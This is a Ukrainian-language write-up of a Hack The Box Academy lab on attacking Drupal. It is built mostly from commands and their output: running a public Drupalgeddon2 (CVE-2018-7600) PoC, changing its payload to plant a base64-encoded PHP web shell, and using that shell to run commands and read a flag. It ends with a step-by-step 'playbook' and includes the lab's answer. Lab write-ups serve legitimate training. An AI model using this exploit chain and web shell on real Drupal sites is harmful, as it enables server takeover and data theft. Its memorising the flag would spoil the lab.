# Attacking Common Applications — Attacking Drupal

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)  
Урок: [Attacking Drupal](https://academy.hackthebox.com/app/module/113/section/1209)  
Ціль: `10.129.42.195`  
vHosts: `drupal-qa.inlanefreight.local`, `drupal-dev.inlanefreight.local`, `drupal.inlanefreight.local`  
Відповідь: `DrUp@l_drUp@l_3veryWh3Re!`

## Концепція

У цій секції показують кілька шляхів до RCE на різних інстансах Drupal: через **PHP Filter** у Drupal 7, через **backdoored module** у Drupal 8, і через відомі RCE-вразливості сімейства **Drupalgeddon**. У вашому лабі фінальний прапор було зручно дістати через **Drupalgeddon2 (CVE-2018-7600)** на `drupal-dev.inlanefreight.local`, а потім прочитати файл у директорії іншого vhost, бо `www-data` мав доступ на читання до `/var/www/drupal.inlanefreight.local/`. [unit42.paloaltonetworks](https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/)

## Крок 1 — vHosts і fingerprint

```bash
echo '10.129.42.195 drupal-qa.inlanefreight.local' | sudo tee -a /etc/hosts
echo '10.129.42.195 drupal-dev.inlanefreight.local' | sudo tee -a /etc/hosts
echo '10.129.42.195 drupal.inlanefreight.local' | sudo tee -a /etc/hosts
cat /etc/hosts | grep inlanefreight
```

Пояснення: Drupal у цьому уроці розбитий на кілька virtual hosts, тому без записів у `/etc/hosts` браузер і `curl` не знатимуть, який сайт віддавати по одному IP. Для `drupal.inlanefreight.local` заголовок `X-Generator` показав Drupal 8, а `CHANGELOG.txt` у корені повертав 404, що типово для новіших інсталяцій, де changelog лежить у `core/CHANGELOG.txt`. [ine](https://ine.com/blog/cve-2018-7600-drupalgeddon-2)

```bash
curl -s -I http://drupal.inlanefreight.local | grep -i X-Generator
curl -s http://drupal.inlanefreight.local/core/CHANGELOG.txt | head
```

## Крок 2 — Drupalgeddon2 на drupal-dev

CVE-2018-7600 дозволяє RCE на вразливих Drupal 7.x/8.x через недостатню валідацію Form API, зокрема через executable callbacks на кшталт `#post_render`. У вашому виводі PoC успішно створив `hello.txt` на `drupal-dev.inlanefreight.local`, що підтвердило вразливість.

```bash
git clone https://github.com/a2u/CVE-2018-7600.git
cd CVE-2018-7600
python3 exploit.py
# Enter target url:
# http://drupal-dev.inlanefreight.local/
```

Перевірка:

```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

Очікувано:
```bash
;-)
```

Важлива деталь: URL у `exploit.py` треба вводити **з протоколом і слешем в кінці**, інакше скрипт ламає конкатенацію та дає `MissingSchema`.

## Крок 3 — Заміна hello.txt на PHP web shell

Спочатку створили PHP-шел і закодували його в base64, щоб безпечно вставити в payload однією командою shell.

```bash
echo '<?php system($_GET[dcfdd5e021a869fcc6dfaef8bf31377e]);?>' | base64
```

Ваш base64:
```bash
PD9waHAgc3lzdGVtKCRfR0VUW2RjZmRkNWUwMjFhODY5ZmNjNmRmYWVmOGJmMzEzNzdlXSk7Pz4K
```

Далі в `exploit.py` замінили рядок:

```python
'mail[#markup]': 'echo ";-)" | tee hello.txt'
```

на:

```python
'mail[#markup]': 'echo PD9waHAgc3lzdGVtKCRfR0VUW2RjZmRkNWUwMjFhODY5ZmNjNmRmYWVmOGJmMzEzNzdlXSk7Pz4K | base64 -d | tee shell.php'
```

Після цього повторний запуск проти `drupal-dev.inlanefreight.local` записав `shell.php` у веброут.

## Крок 4 — Підтвердження RCE

```bash
python3 exploit.py
# http://drupal-dev.inlanefreight.local/

curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Результат:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Це підтвердило виконання команд від імені `www-data`, тобто повноцінний web RCE на `drupal-dev`.

## Крок 5 — Пошук прапора

Прямий `cat /var/www/drupal.inlanefreight.local/flag.txt` нічого не повернув, бо файл мав іншу назву, а не буквальний `flag.txt`. Тому ви правильно перейшли до пошуку через `find`, а далі через `ls -la` у потрібній директорії знайшли реальне ім'я файла: `flag_6470e394cbf6dab6a91682cc8585059b.txt`.

```bash
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=find+/var/www+-iname+flag.txt+2>/dev/null"
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=ls+-la+/var/www/"
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=ls+-la+/var/www/drupal.inlanefreight.local/"
```

Читання прапора:

```bash
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"
```

Результат:
```bash
DrUp@l_drUp@l_3veryWh3Re!
```

## Інші способи з уроку

### PHP Filter у Drupal 7

У старих Drupal 7 можна увімкнути PHP Filter module, створити Basic page і вставити PHP-код для виконання команд, якщо є адмін-доступ. Це не RCE-вразливість ядра, а небезпечна адміністративна можливість, тому в реальному пентесті таке треба узгоджувати з клієнтом.

### Backdoored module у Drupal 8

У Drupal 8 можна завантажити модуль, наприклад CAPTCHA, додати всередину `shell.php` і `.htaccess`, перепакувати архів та встановити його через інтерфейс `Install new module`, якщо є достатні права. Це дає RCE через завантажений бекдор, а не через баг у ядрі.

### Drupalgeddon (CVE-2014-3704)

Drupal 7.0–7.31 уразливий до pre-auth SQLi, що може створити нового admin-користувача, після чого RCE добувається вже через PHP Filter або інший post-auth шлях. Це пояснює, чому `drupal-qa` у попередньому уроці був хорошою ціллю для ланцюжка “створити admin → увімкнути PHP Filter → RCE”.

### Drupalgeddon3 (CVE-2018-7602)

Drupalgeddon3 — це authenticated RCE, яку часто зручно експлуатувати через Metasploit за наявності валідної сесійної cookie та можливості працювати з node deletion flow. Для цього уроку вам не довелось її реально використовувати для прапора, але вона входить до набору “multiple ways” у теорії секції.

## Чому це працює

- **Drupalgeddon2:** уразливі версії Drupal дозволяють виконання довільного коду через зловживання Form API callbacks, що веде до запису файлу або прямого exec на сервері.
- **Міжсайтовий доступ до файлів:** після RCE від імені `www-data` можна читати інші директорії у `/var/www/`, якщо права файлової системи це дозволяють, і саме так був прочитаний прапор з іншого vhost.
- **Ознака сучасного Drupal 8:** `X-Generator: Drupal 8` і наявність `core/` у веброуті добре узгоджуються з поведінкою Drupal 8-інстансу.

## Готовий playbook

```bash
# vhosts
echo '10.129.42.195 drupal-qa.inlanefreight.local' | sudo tee -a /etc/hosts
echo '10.129.42.195 drupal-dev.inlanefreight.local' | sudo tee -a /etc/hosts
echo '10.129.42.195 drupal.inlanefreight.local' | sudo tee -a /etc/hosts

# fingerprint drupal 8
curl -s -I http://drupal.inlanefreight.local | grep -i X-Generator
curl -s http://drupal.inlanefreight.local/core/CHANGELOG.txt | head

# exploit drupalgeddon2
git clone https://github.com/a2u/CVE-2018-7600.git
cd CVE-2018-7600
python3 exploit.py
# http://drupal-dev.inlanefreight.local/

# confirm upload
curl -s http://drupal-dev.inlanefreight.local/hello.txt

# create shell payload
# replace payload in exploit.py with base64-decoded shell.php writer
echo '<?php system($_GET[dcfdd5e021a869fcc6dfaef8bf31377e]);?>' | base64

# rerun exploit
python3 exploit.py
# http://drupal-dev.inlanefreight.local/

# confirm RCE
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# enumerate target dir
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=ls+-la+/var/www/drupal.inlanefreight.local/"

# read flag
curl -s "http://drupal-dev.inlanefreight.local/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"
```
